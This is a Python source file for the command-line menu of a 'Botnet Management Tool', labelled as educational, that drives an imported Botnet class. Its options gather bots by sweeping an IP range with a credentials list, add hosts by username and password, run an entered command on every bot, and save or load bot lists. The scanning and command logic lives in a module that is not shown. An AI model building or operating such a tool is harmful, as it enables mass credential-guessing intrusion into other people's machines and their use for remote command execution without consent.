import argparse

from botnet import Botnet

def display_banner(max_threads: int):
    print()
    print()
    print("=================================")
    print("=     Botnet Management Tool    =")
    print(f"= working_threads: {max_threads}")
    print("=================================")


def main_menu(botnet):
    try:
        while True:
            display_banner(botnet.max_threads)
            print("1. Gather Bots")
            print("2. Add Bot")
            print("3. Execute Command")
            print("4. List Bots")
            print("5. Save Bots to file")
            print("6. Load Bots from file")
            print("'q' for Exit")
            choice = input("Enter your choice: ")

            if choice == '1':
                ip_range = input("Enter IP range in CIDR-Notation [192.168.1.0/24]: ")
                if not ip_range:
                    ip_range = "192.168.1.0/24"
                credentials_file = input("Enter credentials file path [credentials.txt]: ")
                if not credentials_file:
                    credentials_file = "credentials.txt"
                print("[+] Gathering bots...")
                botnet.gather_bots(ip_range, credentials_file)
            elif choice == '2':
                host = input("Enter bot IP: ")
                user = input("Enter username: ")
                password = input("Enter password: ")
                if botnet.add_client(host, user, password):
                    print("[+] Bot added successfully.")
                else:
                    print("[-] Failed to add bot.")
            elif choice == '3':
                command = input("Enter command to execute: ")
                botnet.execute(command)
            elif choice == '4':
                botnet.list_bots()
            elif choice == '5':
                file_path = input("Enter file path to save bots [bots.txt]: ")
                if not file_path:
                    file_path = "bots.txt"
                botnet.save_bots(file_path)
            elif choice == '6':
                file_path = input("Enter file path to load bots [bots.txt]: ")
                if not file_path:
                    file_path = "bots.txt"
                botnet.load_bots(file_path)
            elif choice == 'q':
                botnet.close()
                print("Exiting...")
                break
            else:
                print("Invalid option. Please try again.")
    except KeyboardInterrupt:
        botnet.close()
        print("Exiting...")
        exit(0)


if __name__ == '__main__':
    argparse = argparse.ArgumentParser(
        description="Botnet Management Tool for educational purposes only.",
        usage="python3 main.py -t num_thrads",
        epilog="Botnet Management Tool"
    )
    argparse.add_argument('-t', '--threads', type=int, help='Number of threads to use', default=10)
    args = argparse.parse_args()
    main_menu(Botnet(args.threads))
